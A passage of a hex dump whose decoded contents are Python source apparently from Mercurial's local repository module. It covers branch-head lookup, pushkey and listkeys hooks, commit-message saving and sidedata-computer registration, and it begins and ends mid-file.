-0001eac0: 2020 2020 2020 2020 2072 6574 7572 6e20           return 
-0001ead0: 5b63 6c2e 6e6f 6465 2872 6576 2920 666f  [cl.node(rev) fo
-0001eae0: 7220 7265 7620 696e 2068 6561 6472 6576  r rev in headrev
-0001eaf0: 735d 0a0a 2020 2020 2020 2020 6865 6164  s]..        head
-0001eb00: 7320 3d20 7365 6c66 2e63 6861 6e67 656c  s = self.changel
-0001eb10: 6f67 2e68 6561 6473 2873 7461 7274 290a  og.heads(start).
-0001eb20: 2020 2020 2020 2020 2320 736f 7274 2074          # sort t
-0001eb30: 6865 206f 7574 7075 7420 696e 2072 6576  he output in rev
-0001eb40: 2064 6573 6365 6e64 696e 6720 6f72 6465   descending orde
-0001eb50: 720a 2020 2020 2020 2020 7265 7475 726e  r.        return
-0001eb60: 2073 6f72 7465 6428 6865 6164 732c 206b   sorted(heads, k
-0001eb70: 6579 3d73 656c 662e 6368 616e 6765 6c6f  ey=self.changelo
-0001eb80: 672e 7265 762c 2072 6576 6572 7365 3d54  g.rev, reverse=T
-0001eb90: 7275 6529 0a0a 2020 2020 6465 6620 6272  rue)..    def br
-0001eba0: 616e 6368 6865 6164 7328 7365 6c66 2c20  anchheads(self, 
-0001ebb0: 6272 616e 6368 3d4e 6f6e 652c 2073 7461  branch=None, sta
-0001ebc0: 7274 3d4e 6f6e 652c 2063 6c6f 7365 643d  rt=None, closed=
-0001ebd0: 4661 6c73 6529 3a0a 2020 2020 2020 2020  False):.        
-0001ebe0: 2222 2272 6574 7572 6e20 6120 2870 6f73  """return a (pos
-0001ebf0: 7369 626c 7920 6669 6c74 6572 6564 2920  sibly filtered) 
-0001ec00: 6c69 7374 206f 6620 6865 6164 7320 666f  list of heads fo
-0001ec10: 7220 7468 6520 6769 7665 6e20 6272 616e  r the given bran
-0001ec20: 6368 0a0a 2020 2020 2020 2020 4865 6164  ch..        Head
-0001ec30: 7320 6172 6520 7265 7475 726e 6564 2069  s are returned i
-0001ec40: 6e20 746f 706f 6c6f 6769 6361 6c20 6f72  n topological or
-0001ec50: 6465 722c 2066 726f 6d20 6e65 7765 7374  der, from newest
-0001ec60: 2074 6f20 6f6c 6465 7374 2e0a 2020 2020   to oldest..    
-0001ec70: 2020 2020 4966 2062 7261 6e63 6820 6973      If branch is
-0001ec80: 204e 6f6e 652c 2075 7365 2074 6865 2064   None, use the d
-0001ec90: 6972 7374 6174 6520 6272 616e 6368 2e0a  irstate branch..
-0001eca0: 2020 2020 2020 2020 4966 2073 7461 7274          If start
-0001ecb0: 2069 7320 6e6f 7420 4e6f 6e65 2c20 7265   is not None, re
-0001ecc0: 7475 726e 206f 6e6c 7920 6865 6164 7320  turn only heads 
-0001ecd0: 7265 6163 6861 626c 6520 6672 6f6d 2073  reachable from s
-0001ece0: 7461 7274 2e0a 2020 2020 2020 2020 4966  tart..        If
-0001ecf0: 2063 6c6f 7365 6420 6973 2054 7275 652c   closed is True,
-0001ed00: 2072 6574 7572 6e20 6865 6164 7320 7468   return heads th
-0001ed10: 6174 2061 7265 206d 6172 6b65 6420 6173  at are marked as
-0001ed20: 2063 6c6f 7365 6420 6173 2077 656c 6c2e   closed as well.
-0001ed30: 0a20 2020 2020 2020 2022 2222 0a20 2020  .        """.   
-0001ed40: 2020 2020 2069 6620 6272 616e 6368 2069       if branch i
-0001ed50: 7320 4e6f 6e65 3a0a 2020 2020 2020 2020  s None:.        
-0001ed60: 2020 2020 6272 616e 6368 203d 2073 656c      branch = sel
-0001ed70: 665b 4e6f 6e65 5d2e 6272 616e 6368 2829  f[None].branch()
-0001ed80: 0a20 2020 2020 2020 2062 7261 6e63 6865  .        branche
-0001ed90: 7320 3d20 7365 6c66 2e62 7261 6e63 686d  s = self.branchm
-0001eda0: 6170 2829 0a20 2020 2020 2020 2069 6620  ap().        if 
-0001edb0: 6e6f 7420 6272 616e 6368 6573 2e68 6173  not branches.has
-0001edc0: 6272 616e 6368 2862 7261 6e63 6829 3a0a  branch(branch):.
-0001edd0: 2020 2020 2020 2020 2020 2020 7265 7475              retu
-0001ede0: 726e 205b 5d0a 2020 2020 2020 2020 2320  rn [].        # 
-0001edf0: 7468 6520 6361 6368 6520 7265 7475 726e  the cache return
-0001ee00: 7320 6865 6164 7320 6f72 6465 7265 6420  s heads ordered 
-0001ee10: 6c6f 7765 7374 2074 6f20 6869 6768 6573  lowest to highes
-0001ee20: 740a 2020 2020 2020 2020 6268 6561 6473  t.        bheads
-0001ee30: 203d 206c 6973 7428 7265 7665 7273 6564   = list(reversed
-0001ee40: 2862 7261 6e63 6865 732e 6272 616e 6368  (branches.branch
-0001ee50: 6865 6164 7328 6272 616e 6368 2c20 636c  heads(branch, cl
-0001ee60: 6f73 6564 3d63 6c6f 7365 6429 2929 0a20  osed=closed))). 
-0001ee70: 2020 2020 2020 2069 6620 7374 6172 7420         if start 
-0001ee80: 6973 206e 6f74 204e 6f6e 653a 0a20 2020  is not None:.   
-0001ee90: 2020 2020 2020 2020 2023 2066 696c 7465           # filte
-0001eea0: 7220 6f75 7420 7468 6520 6865 6164 7320  r out the heads 
-0001eeb0: 7468 6174 2063 616e 6e6f 7420 6265 2072  that cannot be r
-0001eec0: 6561 6368 6564 2066 726f 6d20 7374 6172  eached from star
-0001eed0: 7472 6576 0a20 2020 2020 2020 2020 2020  trev.           
-0001eee0: 2066 6268 6561 6473 203d 2073 6574 2873   fbheads = set(s
-0001eef0: 656c 662e 6368 616e 6765 6c6f 672e 6e6f  elf.changelog.no
-0001ef00: 6465 7362 6574 7765 656e 285b 7374 6172  desbetween([star
-0001ef10: 745d 2c20 6268 6561 6473 295b 325d 290a  t], bheads)[2]).
-0001ef20: 2020 2020 2020 2020 2020 2020 6268 6561              bhea
-0001ef30: 6473 203d 205b 6820 666f 7220 6820 696e  ds = [h for h in
-0001ef40: 2062 6865 6164 7320 6966 2068 2069 6e20   bheads if h in 
-0001ef50: 6662 6865 6164 735d 0a20 2020 2020 2020  fbheads].       
-0001ef60: 2072 6574 7572 6e20 6268 6561 6473 0a0a   return bheads..
-0001ef70: 2020 2020 6465 6620 6272 616e 6368 6573      def branches
-0001ef80: 2873 656c 662c 206e 6f64 6573 293a 0a20  (self, nodes):. 
-0001ef90: 2020 2020 2020 2069 6620 6e6f 7420 6e6f         if not no
-0001efa0: 6465 733a 0a20 2020 2020 2020 2020 2020  des:.           
-0001efb0: 206e 6f64 6573 203d 205b 7365 6c66 2e63   nodes = [self.c
-0001efc0: 6861 6e67 656c 6f67 2e74 6970 2829 5d0a  hangelog.tip()].
-0001efd0: 2020 2020 2020 2020 6220 3d20 5b5d 0a20          b = []. 
-0001efe0: 2020 2020 2020 2066 6f72 206e 2069 6e20         for n in 
-0001eff0: 6e6f 6465 733a 0a20 2020 2020 2020 2020  nodes:.         
-0001f000: 2020 2074 203d 206e 0a20 2020 2020 2020     t = n.       
-0001f010: 2020 2020 2077 6869 6c65 2054 7275 653a       while True:
-0001f020: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-0001f030: 2070 203d 2073 656c 662e 6368 616e 6765   p = self.change
-0001f040: 6c6f 672e 7061 7265 6e74 7328 6e29 0a20  log.parents(n). 
-0001f050: 2020 2020 2020 2020 2020 2020 2020 2069                 i
-0001f060: 6620 705b 315d 2021 3d20 7365 6c66 2e6e  f p[1] != self.n
-0001f070: 756c 6c69 6420 6f72 2070 5b30 5d20 3d3d  ullid or p[0] ==
-0001f080: 2073 656c 662e 6e75 6c6c 6964 3a0a 2020   self.nullid:.  
-0001f090: 2020 2020 2020 2020 2020 2020 2020 2020                  
-0001f0a0: 2020 622e 6170 7065 6e64 2828 742c 206e    b.append((t, n
-0001f0b0: 2c20 705b 305d 2c20 705b 315d 2929 0a20  , p[0], p[1])). 
-0001f0c0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-0001f0d0: 2020 2062 7265 616b 0a20 2020 2020 2020     break.       
-0001f0e0: 2020 2020 2020 2020 206e 203d 2070 5b30           n = p[0
-0001f0f0: 5d0a 2020 2020 2020 2020 7265 7475 726e  ].        return
-0001f100: 2062 0a0a 2020 2020 6465 6620 6265 7477   b..    def betw
-0001f110: 6565 6e28 7365 6c66 2c20 7061 6972 7329  een(self, pairs)
-0001f120: 3a0a 2020 2020 2020 2020 7220 3d20 5b5d  :.        r = []
-0001f130: 0a0a 2020 2020 2020 2020 666f 7220 746f  ..        for to
-0001f140: 702c 2062 6f74 746f 6d20 696e 2070 6169  p, bottom in pai
-0001f150: 7273 3a0a 2020 2020 2020 2020 2020 2020  rs:.            
-0001f160: 6e2c 206c 2c20 6920 3d20 746f 702c 205b  n, l, i = top, [
-0001f170: 5d2c 2030 0a20 2020 2020 2020 2020 2020  ], 0.           
-0001f180: 2066 203d 2031 0a0a 2020 2020 2020 2020   f = 1..        
-0001f190: 2020 2020 7768 696c 6520 6e20 213d 2062      while n != b
-0001f1a0: 6f74 746f 6d20 616e 6420 6e20 213d 2073  ottom and n != s
-0001f1b0: 656c 662e 6e75 6c6c 6964 3a0a 2020 2020  elf.nullid:.    
-0001f1c0: 2020 2020 2020 2020 2020 2020 7020 3d20              p = 
-0001f1d0: 7365 6c66 2e63 6861 6e67 656c 6f67 2e70  self.changelog.p
-0001f1e0: 6172 656e 7473 286e 295b 305d 0a20 2020  arents(n)[0].   
-0001f1f0: 2020 2020 2020 2020 2020 2020 2069 6620               if 
-0001f200: 6920 3d3d 2066 3a0a 2020 2020 2020 2020  i == f:.        
-0001f210: 2020 2020 2020 2020 2020 2020 6c2e 6170              l.ap
-0001f220: 7065 6e64 286e 290a 2020 2020 2020 2020  pend(n).        
-0001f230: 2020 2020 2020 2020 2020 2020 6620 3d20              f = 
-0001f240: 6620 2a20 320a 2020 2020 2020 2020 2020  f * 2.          
-0001f250: 2020 2020 2020 6e20 3d20 700a 2020 2020        n = p.    
-0001f260: 2020 2020 2020 2020 2020 2020 6920 2b3d              i +=
-0001f270: 2031 0a0a 2020 2020 2020 2020 2020 2020   1..            
-0001f280: 722e 6170 7065 6e64 286c 290a 0a20 2020  r.append(l)..   
-0001f290: 2020 2020 2072 6574 7572 6e20 720a 0a20       return r.. 
-0001f2a0: 2020 2064 6566 2063 6865 636b 7075 7368     def checkpush
-0001f2b0: 2873 656c 662c 2070 7573 686f 7029 3a0a  (self, pushop):.
-0001f2c0: 2020 2020 2020 2020 2222 2245 7874 656e          """Exten
-0001f2d0: 7369 6f6e 7320 6361 6e20 6f76 6572 7269  sions can overri
-0001f2e0: 6465 2074 6869 7320 6675 6e63 7469 6f6e  de this function
-0001f2f0: 2069 6620 6164 6469 7469 6f6e 616c 2063   if additional c
-0001f300: 6865 636b 7320 6861 7665 0a20 2020 2020  hecks have.     
-0001f310: 2020 2074 6f20 6265 2070 6572 666f 726d     to be perform
-0001f320: 6564 2062 6566 6f72 6520 7075 7368 696e  ed before pushin
-0001f330: 672c 206f 7220 6361 6c6c 2069 7420 6966  g, or call it if
-0001f340: 2074 6865 7920 6f76 6572 7269 6465 2070   they override p
-0001f350: 7573 680a 2020 2020 2020 2020 636f 6d6d  ush.        comm
-0001f360: 616e 642e 0a20 2020 2020 2020 2022 2222  and..        """
-0001f370: 0a0a 2020 2020 4075 6e66 696c 7465 7265  ..    @unfiltere
-0001f380: 6470 726f 7065 7274 7963 6163 6865 0a20  dpropertycache. 
-0001f390: 2020 2064 6566 2070 7265 7075 7368 6f75     def prepushou
-0001f3a0: 7467 6f69 6e67 686f 6f6b 7328 7365 6c66  tgoinghooks(self
-0001f3b0: 293a 0a20 2020 2020 2020 2022 2222 5265  ):.        """Re
-0001f3c0: 7475 726e 2075 7469 6c2e 686f 6f6b 7320  turn util.hooks 
-0001f3d0: 636f 6e73 6973 7473 206f 6620 6120 7075  consists of a pu
-0001f3e0: 7368 6f70 2077 6974 6820 7265 706f 2c20  shop with repo, 
-0001f3f0: 7265 6d6f 7465 2c20 6f75 7467 6f69 6e67  remote, outgoing
-0001f400: 0a20 2020 2020 2020 206d 6574 686f 6473  .        methods
-0001f410: 2c20 7768 6963 6820 6172 6520 6361 6c6c  , which are call
-0001f420: 6564 2062 6566 6f72 6520 7075 7368 696e  ed before pushin
-0001f430: 6720 6368 616e 6765 7365 7473 2e0a 2020  g changesets..  
-0001f440: 2020 2020 2020 2222 220a 2020 2020 2020        """.      
-0001f450: 2020 7265 7475 726e 2075 7469 6c2e 686f    return util.ho
-0001f460: 6f6b 7328 290a 0a20 2020 2064 6566 2070  oks()..    def p
-0001f470: 7573 686b 6579 2873 656c 662c 206e 616d  ushkey(self, nam
-0001f480: 6573 7061 6365 2c20 6b65 792c 206f 6c64  espace, key, old
-0001f490: 2c20 6e65 7729 3a0a 2020 2020 2020 2020  , new):.        
-0001f4a0: 7472 793a 0a20 2020 2020 2020 2020 2020  try:.           
-0001f4b0: 2074 7220 3d20 7365 6c66 2e63 7572 7265   tr = self.curre
-0001f4c0: 6e74 7472 616e 7361 6374 696f 6e28 290a  nttransaction().
-0001f4d0: 2020 2020 2020 2020 2020 2020 686f 6f6b              hook
-0001f4e0: 6172 6773 203d 207b 7d0a 2020 2020 2020  args = {}.      
-0001f4f0: 2020 2020 2020 6966 2074 7220 6973 206e        if tr is n
-0001f500: 6f74 204e 6f6e 653a 0a20 2020 2020 2020  ot None:.       
-0001f510: 2020 2020 2020 2020 2068 6f6f 6b61 7267           hookarg
-0001f520: 732e 7570 6461 7465 2874 722e 686f 6f6b  s.update(tr.hook
-0001f530: 6172 6773 290a 2020 2020 2020 2020 2020  args).          
-0001f540: 2020 686f 6f6b 6172 6773 203d 2070 7963    hookargs = pyc
-0001f550: 6f6d 7061 742e 7374 726b 7761 7267 7328  ompat.strkwargs(
-0001f560: 686f 6f6b 6172 6773 290a 2020 2020 2020  hookargs).      
-0001f570: 2020 2020 2020 686f 6f6b 6172 6773 5b27        hookargs['
-0001f580: 6e61 6d65 7370 6163 6527 5d20 3d20 6e61  namespace'] = na
-0001f590: 6d65 7370 6163 650a 2020 2020 2020 2020  mespace.        
-0001f5a0: 2020 2020 686f 6f6b 6172 6773 5b27 6b65      hookargs['ke
-0001f5b0: 7927 5d20 3d20 6b65 790a 2020 2020 2020  y'] = key.      
-0001f5c0: 2020 2020 2020 686f 6f6b 6172 6773 5b27        hookargs['
-0001f5d0: 6f6c 6427 5d20 3d20 6f6c 640a 2020 2020  old'] = old.    
-0001f5e0: 2020 2020 2020 2020 686f 6f6b 6172 6773          hookargs
-0001f5f0: 5b27 6e65 7727 5d20 3d20 6e65 770a 2020  ['new'] = new.  
-0001f600: 2020 2020 2020 2020 2020 7365 6c66 2e68            self.h
-0001f610: 6f6f 6b28 6227 7072 6570 7573 686b 6579  ook(b'prepushkey
-0001f620: 272c 2074 6872 6f77 3d54 7275 652c 202a  ', throw=True, *
-0001f630: 2a68 6f6f 6b61 7267 7329 0a20 2020 2020  *hookargs).     
-0001f640: 2020 2065 7863 6570 7420 6572 726f 722e     except error.
-0001f650: 486f 6f6b 4162 6f72 7420 6173 2065 7863  HookAbort as exc
-0001f660: 3a0a 2020 2020 2020 2020 2020 2020 7365  :.            se
-0001f670: 6c66 2e75 692e 7772 6974 655f 6572 7228  lf.ui.write_err(
-0001f680: 5f28 6222 7075 7368 6b65 792d 6162 6f72  _(b"pushkey-abor
-0001f690: 743a 2025 735c 6e22 2920 2520 6578 6329  t: %s\n") % exc)
-0001f6a0: 0a20 2020 2020 2020 2020 2020 2069 6620  .            if 
-0001f6b0: 6578 632e 6869 6e74 3a0a 2020 2020 2020  exc.hint:.      
-0001f6c0: 2020 2020 2020 2020 2020 7365 6c66 2e75            self.u
-0001f6d0: 692e 7772 6974 655f 6572 7228 5f28 6222  i.write_err(_(b"
-0001f6e0: 2825 7329 5c6e 2229 2025 2065 7863 2e68  (%s)\n") % exc.h
-0001f6f0: 696e 7429 0a20 2020 2020 2020 2020 2020  int).           
-0001f700: 2072 6574 7572 6e20 4661 6c73 650a 2020   return False.  
-0001f710: 2020 2020 2020 7365 6c66 2e75 692e 6465        self.ui.de
-0001f720: 6275 6728 6227 7075 7368 696e 6720 6b65  bug(b'pushing ke
-0001f730: 7920 666f 7220 2225 733a 2573 225c 6e27  y for "%s:%s"\n'
-0001f740: 2025 2028 6e61 6d65 7370 6163 652c 206b   % (namespace, k
-0001f750: 6579 2929 0a20 2020 2020 2020 2072 6574  ey)).        ret
-0001f760: 203d 2070 7573 686b 6579 2e70 7573 6828   = pushkey.push(
-0001f770: 7365 6c66 2c20 6e61 6d65 7370 6163 652c  self, namespace,
-0001f780: 206b 6579 2c20 6f6c 642c 206e 6577 290a   key, old, new).
-0001f790: 0a20 2020 2020 2020 2064 6566 2072 756e  .        def run
-0001f7a0: 686f 6f6b 2875 6e75 7365 645f 7375 6363  hook(unused_succ
-0001f7b0: 6573 7329 3a0a 2020 2020 2020 2020 2020  ess):.          
-0001f7c0: 2020 7365 6c66 2e68 6f6f 6b28 0a20 2020    self.hook(.   
-0001f7d0: 2020 2020 2020 2020 2020 2020 2062 2770               b'p
-0001f7e0: 7573 686b 6579 272c 0a20 2020 2020 2020  ushkey',.       
-0001f7f0: 2020 2020 2020 2020 206e 616d 6573 7061           namespa
-0001f800: 6365 3d6e 616d 6573 7061 6365 2c0a 2020  ce=namespace,.  
-0001f810: 2020 2020 2020 2020 2020 2020 2020 6b65                ke
-0001f820: 793d 6b65 792c 0a20 2020 2020 2020 2020  y=key,.         
-0001f830: 2020 2020 2020 206f 6c64 3d6f 6c64 2c0a         old=old,.
-0001f840: 2020 2020 2020 2020 2020 2020 2020 2020                  
-0001f850: 6e65 773d 6e65 772c 0a20 2020 2020 2020  new=new,.       
-0001f860: 2020 2020 2020 2020 2072 6574 3d72 6574           ret=ret
-0001f870: 2c0a 2020 2020 2020 2020 2020 2020 290a  ,.            ).
-0001f880: 0a20 2020 2020 2020 2073 656c 662e 5f61  .        self._a
-0001f890: 6674 6572 6c6f 636b 2872 756e 686f 6f6b  fterlock(runhook
-0001f8a0: 290a 2020 2020 2020 2020 7265 7475 726e  ).        return
-0001f8b0: 2072 6574 0a0a 2020 2020 6465 6620 6c69   ret..    def li
-0001f8c0: 7374 6b65 7973 2873 656c 662c 206e 616d  stkeys(self, nam
-0001f8d0: 6573 7061 6365 293a 0a20 2020 2020 2020  espace):.       
-0001f8e0: 2073 656c 662e 686f 6f6b 2862 2770 7265   self.hook(b'pre
-0001f8f0: 6c69 7374 6b65 7973 272c 2074 6872 6f77  listkeys', throw
-0001f900: 3d54 7275 652c 206e 616d 6573 7061 6365  =True, namespace
-0001f910: 3d6e 616d 6573 7061 6365 290a 2020 2020  =namespace).    
-0001f920: 2020 2020 7365 6c66 2e75 692e 6465 6275      self.ui.debu
-0001f930: 6728 6227 6c69 7374 696e 6720 6b65 7973  g(b'listing keys
-0001f940: 2066 6f72 2022 2573 225c 6e27 2025 206e   for "%s"\n' % n
-0001f950: 616d 6573 7061 6365 290a 2020 2020 2020  amespace).      
-0001f960: 2020 7661 6c75 6573 203d 2070 7573 686b    values = pushk
-0001f970: 6579 2e6c 6973 7428 7365 6c66 2c20 6e61  ey.list(self, na
-0001f980: 6d65 7370 6163 6529 0a20 2020 2020 2020  mespace).       
-0001f990: 2073 656c 662e 686f 6f6b 2862 276c 6973   self.hook(b'lis
-0001f9a0: 746b 6579 7327 2c20 6e61 6d65 7370 6163  tkeys', namespac
-0001f9b0: 653d 6e61 6d65 7370 6163 652c 2076 616c  e=namespace, val
-0001f9c0: 7565 733d 7661 6c75 6573 290a 2020 2020  ues=values).    
-0001f9d0: 2020 2020 7265 7475 726e 2076 616c 7565      return value
-0001f9e0: 730a 0a20 2020 2064 6566 2064 6562 7567  s..    def debug
-0001f9f0: 7769 7265 6172 6773 2873 656c 662c 206f  wireargs(self, o
-0001fa00: 6e65 2c20 7477 6f2c 2074 6872 6565 3d4e  ne, two, three=N
-0001fa10: 6f6e 652c 2066 6f75 723d 4e6f 6e65 2c20  one, four=None, 
-0001fa20: 6669 7665 3d4e 6f6e 6529 3a0a 2020 2020  five=None):.    
-0001fa30: 2020 2020 2727 2775 7365 6420 746f 2074      '''used to t
-0001fa40: 6573 7420 6172 6775 6d65 6e74 2070 6173  est argument pas
-0001fa50: 7369 6e67 206f 7665 7220 7468 6520 7769  sing over the wi
-0001fa60: 7265 2727 270a 2020 2020 2020 2020 7265  re'''.        re
-0001fa70: 7475 726e 2062 2225 7320 2573 2025 7320  turn b"%s %s %s 
-0001fa80: 2573 2025 7322 2025 2028 0a20 2020 2020  %s %s" % (.     
-0001fa90: 2020 2020 2020 206f 6e65 2c0a 2020 2020         one,.    
-0001faa0: 2020 2020 2020 2020 7477 6f2c 0a20 2020          two,.   
-0001fab0: 2020 2020 2020 2020 2070 7963 6f6d 7061           pycompa
-0001fac0: 742e 6279 7465 7374 7228 7468 7265 6529  t.bytestr(three)
-0001fad0: 2c0a 2020 2020 2020 2020 2020 2020 7079  ,.            py
-0001fae0: 636f 6d70 6174 2e62 7974 6573 7472 2866  compat.bytestr(f
-0001faf0: 6f75 7229 2c0a 2020 2020 2020 2020 2020  our),.          
-0001fb00: 2020 7079 636f 6d70 6174 2e62 7974 6573    pycompat.bytes
-0001fb10: 7472 2866 6976 6529 2c0a 2020 2020 2020  tr(five),.      
-0001fb20: 2020 290a 0a20 2020 2064 6566 2073 6176    )..    def sav
-0001fb30: 6563 6f6d 6d69 746d 6573 7361 6765 2873  ecommitmessage(s
-0001fb40: 656c 662c 2074 6578 7429 3a0a 2020 2020  elf, text):.    
-0001fb50: 2020 2020 6670 203d 2073 656c 662e 7666      fp = self.vf
-0001fb60: 7328 6227 6c61 7374 2d6d 6573 7361 6765  s(b'last-message
-0001fb70: 2e74 7874 272c 2062 2777 6227 290a 2020  .txt', b'wb').  
-0001fb80: 2020 2020 2020 7472 793a 0a20 2020 2020        try:.     
-0001fb90: 2020 2020 2020 2066 702e 7772 6974 6528         fp.write(
-0001fba0: 7465 7874 290a 2020 2020 2020 2020 6669  text).        fi
-0001fbb0: 6e61 6c6c 793a 0a20 2020 2020 2020 2020  nally:.         
-0001fbc0: 2020 2066 702e 636c 6f73 6528 290a 2020     fp.close().  
-0001fbd0: 2020 2020 2020 7265 7475 726e 2073 656c        return sel
-0001fbe0: 662e 7061 7468 746f 2866 702e 6e61 6d65  f.pathto(fp.name
-0001fbf0: 5b6c 656e 2873 656c 662e 726f 6f74 2920  [len(self.root) 
-0001fc00: 2b20 3120 3a5d 290a 0a20 2020 2064 6566  + 1 :])..    def
-0001fc10: 2072 6567 6973 7465 725f 7761 6e74 6564   register_wanted
-0001fc20: 5f73 6964 6564 6174 6128 7365 6c66 2c20  _sidedata(self, 
-0001fc30: 6361 7465 676f 7279 293a 0a20 2020 2020  category):.     
-0001fc40: 2020 2069 6620 7265 706f 7369 746f 7279     if repository
-0001fc50: 2e52 4550 4f5f 4645 4154 5552 455f 5349  .REPO_FEATURE_SI
-0001fc60: 4445 5f44 4154 4120 6e6f 7420 696e 2073  DE_DATA not in s
-0001fc70: 656c 662e 6665 6174 7572 6573 3a0a 2020  elf.features:.  
-0001fc80: 2020 2020 2020 2020 2020 2320 4f6e 6c79            # Only
-0001fc90: 2072 6576 6c6f 6776 3220 7265 706f 7320   revlogv2 repos 
-0001fca0: 6361 6e20 7761 6e74 2073 6964 6564 6174  can want sidedat
-0001fcb0: 612e 0a20 2020 2020 2020 2020 2020 2072  a..            r
-0001fcc0: 6574 7572 6e0a 2020 2020 2020 2020 7365  eturn.        se
-0001fcd0: 6c66 2e5f 7761 6e74 6564 5f73 6964 6564  lf._wanted_sided
-0001fce0: 6174 612e 6164 6428 7079 636f 6d70 6174  ata.add(pycompat
-0001fcf0: 2e62 7974 6573 7472 2863 6174 6567 6f72  .bytestr(categor
-0001fd00: 7929 290a 0a20 2020 2064 6566 2072 6567  y))..    def reg
-0001fd10: 6973 7465 725f 7369 6465 6461 7461 5f63  ister_sidedata_c
-0001fd20: 6f6d 7075 7465 7228 0a20 2020 2020 2020  omputer(.       
-0001fd30: 2073 656c 662c 206b 696e 642c 2063 6174   self, kind, cat
-0001fd40: 6567 6f72 792c 206b 6579 732c 2063 6f6d  egory, keys, com
-0001fd50: 7075 7465 722c 2066 6c61 6773 2c20 7265  puter, flags, re
-0001fd60: 706c 6163 653d 4661 6c73 650a 2020 2020  place=False.    
-0001fd70: 293a 0a20 2020 2020 2020 2069 6620 6b69  ):.        if ki
-0001fd80: 6e64 206e 6f74 2069 6e20 7265 766c 6f67  nd not in revlog
-0001fd90: 636f 6e73 742e 414c 4c5f 4b49 4e44 533a  const.ALL_KINDS:
-0001fda0: 0a20 2020 2020 2020 2020 2020 206d 7367  .            msg
-0001fdb0: 203d 205f 2862 2275 6e65 7870 6563 7465   = _(b"unexpecte
-0001fdc0: 6420 7265 766c 6f67 206b 696e 6420 2725  d revlog kind '%
-0001fdd0: 7327 2e22 290a 2020 2020 2020 2020 2020  s'.").          
-0001fde0: 2020 7261 6973 6520 6572 726f 722e 5072    raise error.Pr
-0001fdf0: 6f67 7261 6d6d 696e 6745 7272 6f72 286d  ogrammingError(m
-0001fe00: 7367 2025 206b 696e 6429 0a20 2020 2020  sg % kind).     
-0001fe10: 2020 2063 6174 6567 6f72 7920 3d20 7079     category = py
-0001fe20: 636f 6d70 6174 2e62 7974 6573 7472 2863  compat.bytestr(c
-0001fe30: 6174 6567 6f72 7929 0a20 2020 2020 2020  ategory).       
-0001fe40: 2061 6c72 6561 6479 5f72 6567 6973 7465   already_registe
-0001fe50: 7265 6420 3d20 6361 7465 676f 7279 2069  red = category i
-0001fe60: 6e20 7365 6c66 2e5f 7369 6465 6461 7461  n self._sidedata
-0001fe70: 5f63 6f6d 7075 7465 7273 2e67 6574 286b  _computers.get(k
-0001fe80: 696e 642c 205b 5d29 0a20 2020 2020 2020  ind, []).       
-0001fe90: 2069 6620 616c 7265 6164 795f 7265 6769   if already_regi
-0001fea0: 7374 6572 6564 2061 6e64 206e 6f74 2072  stered and not r
-0001feb0: 6570 6c61 6365 3a0a 2020 2020 2020 2020  eplace:.        
-0001fec0: 2020 2020 6d73 6720 3d20 5f28 0a20 2020      msg = _(.   
-0001fed0: 2020 2020 2020 2020 2020 2020 2062 2263               b"c
-0001fee0: 616e 6e6f 7420 7265 6769 7374 6572 2061  annot register a
-0001fef0: 2073 6964 6564 6174 6120 636f 6d70 7574   sidedata comput
-0001ff00: 6572 2074 7769 6365 2066 6f72 2063 6174  er twice for cat
-0001ff10: 6567 6f72 7920 2725 7327 2e22 0a20 2020  egory '%s'.".   
-0001ff20: 2020 2020 2020 2020 2029 0a20 2020 2020           ).     
-0001ff30: 2020 2020 2020 2072 6169 7365 2065 7272         raise err
-0001ff40: 6f72 2e50 726f 6772 616d 6d69 6e67 4572  or.ProgrammingEr
-0001ff50: 726f 7228 6d73 6720 2520 6361 7465 676f  ror(msg % catego
-0001ff60: 7279 290a 2020 2020 2020 2020 6966 2072  ry).        if r
-0001ff70: 6570 6c61 6365 2061 6e64 206e 6f74 2061  eplace and not a
-0001ff80: 6c72 6561 6479 5f72 6567 6973 7465 7265  lready_registere
-0001ff90: 643a 0a20 2020 2020 2020 2020 2020 206d  d:.            m
-0001ffa0: 7367 203d 205f 280a 2020 2020 2020 2020  sg = _(.        
-0001ffb0: 2020 2020 2020 2020 6222 6361 6e6e 6f74          b"cannot
-0001ffc0: 2072 6570 6c61 6365 2061 2073 6964 6564   replace a sided
-0001ffd0: 6174 6120 636f 6d70 7574 6572 2074 6861  ata computer tha
-0001ffe0: 7420 6973 6e27 7420 7265 6769 7374 6572  t isn't register
-0001fff0: 6564 2022 0a20 2020 2020 2020 2020 2020  ed ".           
-00020000: 2020 2020 2062 2266 6f72 2063 6174 6567       b"for categ
-00020010: 6f72 7920 2725 7327 2e22 0a20 2020 2020  ory '%s'.".     
-00020020: 2020 2020 2020 2029 0a20 2020 2020 2020         ).       
-00020030: 2020 2020 2072 6169 7365 2065 7272 6f72       raise error
-00020040: 2e50 726f 6772 616d 6d69 6e67 4572 726f  .ProgrammingErro
-00020050: 7228 6d73 6720 2520 6361 7465 676f 7279  r(msg % category
-00020060: 290a 2020 2020 2020 2020 7365 6c66 2e5f  ).        self._
-00020070: 7369 6465 6461 7461 5f63 6f6d 7075 7465  sidedata_compute
-00020080: 7273 2e73 6574 6465 6661 756c 7428 6b69  rs.setdefault(ki
-00020090: 6e64 2c20 7b7d 290a 2020 2020 2020 2020  nd, {}).        
-000200a0: 7365 6c66 2e5f 7369 6465 6461 7461 5f63  self._sidedata_c
-000200b0: 6f6d 7075 7465 7273 5b6b 696e 645d 5b63  omputers[kind][c
-000200c0: 6174 6567 6f72 795d 203d 2028 6b65 7973  ategory] = (keys
-000200d0: 2c20 636f 6d70 7574 6572 2c20 666c 6167  , computer, flag
-000200e0: 7329 0a0a 0a64 6566 2075 6e64 6f6e 616d  s)...def undonam
-000200f0: 6528 666e 3a20 6279 7465 7329 202d 3e20  e(fn: bytes) -> 
-00020100: 6279 7465 733a 0a20 2020 2062 6173 652c  bytes:.    base,
-00020110: 206e 616d 6520 3d20 6f73 2e70 6174 682e   name = os.path.
-00020120: 7370 6c69 7428 666e 290a 2020 2020 6173  split(fn).    as
-00020130: 7365 7274 206e 616d 652e 7374 6172 7473  sert name.starts
-00020140: 7769 7468 2862 276a 6f75 726e 616c 2729  with(b'journal')
-00020150: 0a20 2020 2072 6574 7572 6e20 6f73 2e70  .    return os.p
-00020160: 6174 682e 6a6f 696e 2862 6173 652c 206e  ath.join(base, n
-00020170: 616d 652e 7265 706c 6163 6528 6227 6a6f  ame.replace(b'jo
-00020180: 7572 6e61 6c27 2c20 6227 756e 646f 272c  urnal', b'undo',
